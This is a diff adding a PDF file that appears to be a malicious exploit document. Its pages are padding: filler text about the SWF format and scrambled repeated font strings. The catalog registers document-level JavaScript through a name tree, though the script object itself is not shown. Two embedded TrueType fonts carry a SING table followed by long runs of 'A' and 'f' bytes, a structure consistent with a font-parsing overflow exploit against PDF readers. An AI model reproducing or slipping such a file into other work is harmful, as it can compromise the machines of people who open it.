@@ -1,0 +1,1078 @@
+%PDF-1.6
+%‚„œ”
+1 0 obj 
+<<
+/Names 2 0 R
+/Pages 3 0 R
+/AcroForm 4 0 R
+/Type /Catalog
+>>
+endobj 
+3 0 obj 
+<<
+/Kids [5 0 R 6 0 R 7 0 R 8 0 R 9 0 R 10 0 R 11 0 R 12 0 R 13 0 R]
+/Type /Pages
+/Count 9
+>>
+endobj 
+7 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/F1 15 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 3
+/Type /Page
+/Contents [16 0 R]
+>>
+endobj 
+6 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/TT0 17 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 2
+/Type /Page
+/Contents [18 0 R]
+>>
+endobj 
+5 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/TT0 19 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 1
+/Type /Page
+/Contents [20 0 R]
+>>
+endobj 
+14 0 obj [/ICCBased 21 0 R]
+endobj 
+21 0 obj 
+<<
+/N 1
+/Length 0
+>>
+stream
+
+endstream 
+endobj 
+17 0 obj 
+<<
+/LastChar 255
+/BaseFont /Tahoma
+/Subtype /TrueType
+/Widths [1000 1000 1000 1000]
+/FontDescriptor 22 0 R
+/Type /Font
+/Encoding /WinAnsiEncoding
+/FirstChar 0
+>>
+endobj 
+19 0 obj 
+<<
+/LastChar 255
+/BaseFont /Tahoma
+/Subtype /TrueType
+/Widths [1000 1000 1000 1000]
+/FontDescriptor 22 0 R
+/Type /Font
+/Encoding /WinAnsiEncoding
+/FirstChar 0
+>>
+endobj 
+16 0 obj 
+<<
+/Length 96
+/Length1 96
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+BT
+0  scn
+/F1 32 Tf
+12 0 0 12 16 749.25 Tm
+(1)Tj
+ET
+endstream 
+endobj 
+18 0 obj 
+<<
+/Length 3553
+/Length1 3553
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScroma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/TiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+The SWF (pronoiff ? file format delivers vector graphics, text, video, and sound
+over the Internet and is supported by Adobe?Flash?Player software. The SWF file format is
+designed to be an efficient delivery format, not a format for exchanging graphics between
+graphics editors. It is designed to meet the following goals:
+On-screen disormat is primarily intended for on-screen display and supports
+anti-aliasing, fast rendering to a bitmap of any color format, animation, and interactive
+buttons.
+Extensibirmat is a tagged format, so it can be evolved with new features while
+maintaining backward compatibility with earlier versions of Flash Player.
+Network delormat can travel over a network with limited and unpredictable
+bandwidth. The files are compressed to be small and support incremental rendering through
+streaming. The SWF file format is a binary format and is not human readable like HTML.
+The SWF file format uses techniques such as bit-packing and structures with optional fields
+to minimize file size.
+Simpe format is simple so that Flash Player is small and easily ported. Also, Flash
+Player depends upon a limited set of operating system features only.
+File indepene files display with minimal dependence on external resources such
+as fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScript object model that allows interaction with drawing
+primitives, servers, and features of Flash Player.
+SWF files have the extension .swf and a MIME type of application/x-shockwave-flash.
+
+
+BT
+0  scn
+/TT0 2 Tf
+12 0 0 12 16 749.25 Tm
+(2)Tj
+ET
+endstream 
+endobj 
+20 0 obj 
+<<
+/Length 4101
+/Length1 4101
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BasefdsFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncodisangdsa/FontDescripfdtaor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinafnsiEncodfding/FontDessacrifpaor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFontfd/Tahoma/Encoding/WinAnsiEdsncoding/Ffdefdcriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFontfdsa/Tahoma/Encoding/WinAnsiEncoding/dfaFontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEnfdacoding/FontDsescriptor/BasdeFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDfdfdsescraiptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsfdsaiEncoding/FontDescriptor/BaaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptorf/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEfdsancoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+aseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScrahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encodinas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScrg/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+
+
+BT
+0  scn
+/TT0 2 Tf
+12 0 0 12 16 749.25 Tm
+(3)Tj
+ET
+endstream 
+endobj 
+2 0 obj 
+<<
+/JavaScript 23 0 R
+>>
+endobj 
+23 0 obj 
+<<
+/Names [(a) 24 0 R (b) 25 0 R (d) 26 0 R]
+>>
+endobj 
+26 0 obj 
+<<
+/JS 27 0 R
+/S /JavaScript
+>>
+endobj 
+22 0 obj 
+<<
+/FontName /Tahoma
+/StemV 92
+/Ascent 1034
+/Flags 32
+/FontWeight 400
+/XHeight 545
+/FontFamily (Tahoma)
+/FontStretch /Normal
+/Descent -207
+/ItalicAngle 0
+/FontBBox [-600 -207 1338 1034]
+/Type /FontDescriptor
+/CapHeight 727
+>>
+endobj 
+15 0 obj 
+<<
+/BaseFont /Cinema
+/Subtype /TrueType
+/FontDescriptor 28 0 R
+/Widths []
+/Name /F1
+/Encoding /MacRomanEncoding
+/Type /Font
+>>
+endobj 
+28 0 obj 
+<<
+/Flags 131140
+/FontFile2 29 0 R
+/FontName /Cinema
+/FontBBox [-177 -269 1123 866]
+/Type /FontDescriptor
+>>
+endobj 
+29 0 obj 
+<<
+/Length 7965
+/Length1 7965
+>>
+stream
+       OS/2¥_Ùc  Îp   V—ä^ó  Î»   6""""§√Ë†  ±l  X3333ˇ”9  ¸  ¸DDDDÁ¥Òƒ  &`   ãgasp   H   glyftAœ  &Ï  ä~hdmx4!  Ï   Hhead›Ñ¢– T   6hheaEo  ÎL   $hmtx	∆é≤  ¥ƒ  0kern‹R’ô  Ω†  -älocaÛÀ“=  ªÑ  maxpG:  Î,    SINGŸº»µ    ﬂpost¥Z/ª  ∏Ù  éprep;Ò    ¯  h          : AAAAAAAAßÇJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA∆äJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8ÀÄJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAl   AAAAfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff∏∏    ∫¬gë˛â˛
+Lm          
+endstream 
+endobj 
+10 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/F1 30 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 6
+/Type /Page
+/Contents [31 0 R]
+>>
+endobj 
+9 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/TT0 17 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 5
+/Type /Page
+/Contents [32 0 R]
+>>
+endobj 
+8 0 obj 
+<<
+/Parent 3 0 R
+/Resources 
+<<
+/ColorSpace 
+<<
+/CS0 14 0 R
+>>
+/Font 
+<<
+/TT0 19 0 R
+>>
+/ProcSet [/PDF]
+>>
+/MediaBox [0 0 595 842]
+/pdftk_PageNum 4
+/Type /Page
+/Contents [33 0 R]
+>>
+endobj 
+30 0 obj 
+<<
+/BaseFont /Cinema
+/Subtype /TrueType
+/FontDescriptor 34 0 R
+/Widths []
+/Name /F1
+/Encoding /MacRomanEncoding
+/Type /Font
+>>
+endobj 
+34 0 obj 
+<<
+/Flags 131140
+/FontFile2 35 0 R
+/FontName /Cinema
+/FontBBox [-177 -269 1123 866]
+/Type /FontDescriptor
+>>
+endobj 
+35 0 obj 
+<<
+/Length 7965
+/Length1 7965
+>>
+stream
+       OS/2¥_Ùc  Îp   V—ä^ó  Î»   6""""§√Ë†  ±l  X3333ˇ”9  ¸  ¸DDDDÁ¥Òƒ  &`   ãgasp   H   glyftAœ  &Ï  ä~hdmx4!  Ï   Hhead›Ñ¢– T   6hheaEo  ÎL   $hmtx	∆é≤  ¥ƒ  0kern‹R’ô  Ω†  -älocaÛÀ“=  ªÑ  maxpG:  Î,    SINGŸº»µ    ﬂpost¥Z/ª  ∏Ù  éprep;Ò    ¯  h          : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‡_ÑJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHÄJL√ÅJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAl   AAAAfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff